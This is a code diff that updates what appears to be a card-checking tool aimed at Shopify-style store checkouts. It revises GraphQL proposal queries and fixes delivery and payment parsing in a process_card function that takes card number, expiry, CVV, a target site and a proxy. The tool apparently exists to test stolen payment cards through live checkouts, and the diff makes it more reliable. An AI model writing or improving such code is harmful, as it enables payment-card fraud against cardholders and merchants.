@@ -9,7 +9,7 @@ from flask import Flask, request, jsonify
 import os
 import time
 
-# --- FIXED UNION TYPES IN GRAPHQL QUERIES ---
+# --- UPDATED QUERIES WITH __typename AND FALLBACKS ---
 QUERY_PROPOSAL_SHIPPING = """query Proposal($sessionInput: SessionTokenInput!, $delivery: DeliveryTermsInput, $merchandise: MerchandiseTermInput, $payment: PaymentTermInput, $buyerIdentity: BuyerIdentityTermInput, $taxes: TaxTermInput, $queueToken: String, $discounts: DiscountTermsInput) {
   session(sessionInput: $sessionInput) {
     negotiate(input: {
@@ -64,15 +64,25 @@ fragment ProposalDetails on Proposal {
     }
   }
   delivery {
+    __typename
     ... on FilledDeliveryTerms {
       deliveryLines {
+        __typename
         availableDeliveryStrategies {
+          __typename
           ... on CompleteDeliveryStrategy {
             handle
             amount { ... on MoneyValueConstraint { value { amount currencyCode } } }
           }
         }
       }
+    }
+    ... on PendingTerms {
+      pollAfter
+      taskId
+    }
+    ... on UnavailableTerms {
+      __typename
     }
   }
   tax {
@@ -81,9 +91,13 @@ fragment ProposalDetails on Proposal {
     }
   }
   payment {
+    __typename
     ... on FilledPaymentTerms {
       availablePaymentLines {
+        __typename
+        placements
         paymentMethod {
+          __typename
           ... on PaymentProvider {
             paymentMethodIdentifier
             name
@@ -110,8 +124,56 @@ fragment ProposalDetails on Proposal {
             paymentMethodIdentifier
             name
           }
+          ... on WalletsPlatformConfiguration {
+            name
+          }
+          ... on PaypalWalletConfig {
+            paymentMethodIdentifier
+            name
+          }
+          ... on ShopPayWalletConfig {
+            paymentMethodIdentifier
+            name
+          }
+          ... on ShopifyInstallmentsWalletConfig {
+            paymentMethodIdentifier
+            name
+          }
+          ... on FacebookPayWalletConfig {
+            paymentMethodIdentifier
+            name
+          }
+          ... on ApplePayWalletConfig {
+            paymentMethodIdentifier
+            name
+          }
+          ... on GooglePayWalletConfig {
+            paymentMethodIdentifier
+            name
+          }
+          ... on AmazonPayClassicWalletConfig {
+            name
+          }
+          ... on LocalPaymentMethodConfig {
+            paymentMethodIdentifier
+            name
+            displayName
+          }
+          ... on AnyPaymentOnDeliveryMethod {
+            paymentMethodIdentifier
+            name
+          }
+          ... on DeferredPaymentMethod {
+            displayName
+          }
         }
       }
+    }
+    ... on PendingTerms {
+      pollDelay
+    }
+    ... on UnavailableTerms {
+      __typename
     }
   }
 }"""
@@ -1097,9 +1159,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if seller_proposal is None:
                 return False, "Seller proposal is null", gateway, total_price, currency
 
-            delivery_data = seller_proposal.get('delivery')
             running_total_data = seller_proposal.get('runningTotal')
-
             if not running_total_data:
                 return False, "No runningTotal in sellerProposal", gateway, total_price, currency
 
@@ -1129,23 +1189,19 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 except (ValueError, TypeError):
                     pass
 
-            if not delivery_data:
-                return False, "No delivery data in proposal", gateway, total_price, currency
-            
+            # --- DELIVERY LOGIC FIX ---
+            delivery_data = seller_proposal.get('delivery') or {}
             delivery_type = delivery_data.get('__typename', '')
             
-            if delivery_type == 'PendingTerms':
-                delivery_strategy = ''
-                shipping_amount = 0.0
-            elif delivery_type == 'FilledDeliveryTerms':
-                delivery_lines = delivery_data.get('deliveryLines', [{}])
-                if delivery_lines and len(delivery_lines) > 0:
-                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
-                    if available_strategies and len(available_strategies) > 0:
+            if delivery_type == 'FilledDeliveryTerms':
+                delivery_lines = delivery_data.get('deliveryLines') or []
+                if delivery_lines:
+                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies') or []
+                    if available_strategies:
                         delivery_strategy = available_strategies[0].get('handle', '')
-                        shipping_amount_data = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
+                        amount_val = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                         try:
-                            shipping_amount = float(shipping_amount_data)
+                            shipping_amount = float(amount_val)
                         except:
                             shipping_amount = 0.0
                     else:
@@ -1168,18 +1224,18 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             except:
                 tax_amount = 0.0
 
-            payment_data = seller_proposal.get('payment', {})
-            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
-                payment_methods = payment_data.get('availablePaymentLines', [])
+            # --- PAYMENT LOGIC FIX ---
+            payment_data = seller_proposal.get('payment') or {}
+            if payment_data.get('__typename') == 'FilledPaymentTerms':
+                payment_methods = payment_data.get('availablePaymentLines') or []
                 for method in payment_methods:
-                    payment_method = method.get('paymentMethod', {})
-                    if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
-                        payment_identifier = payment_method.get('paymentMethodIdentifier')
-                        displayName = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'Unknown')
-                        
-                        gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
+                    payment_method = method.get('paymentMethod') or {}
+                    pid = payment_method.get('paymentMethodIdentifier')
+                    name = payment_method.get('extensibilityDisplayName') or payment_method.get('displayName') or payment_method.get('name')
+                    if pid or name:
+                        payment_identifier = pid
+                        gateway = name or "UNKNOWN"
                         total_price = str(float(running_total) + shipping_amount + tax_amount)
-                        
                         break
             
             if not payment_identifier:
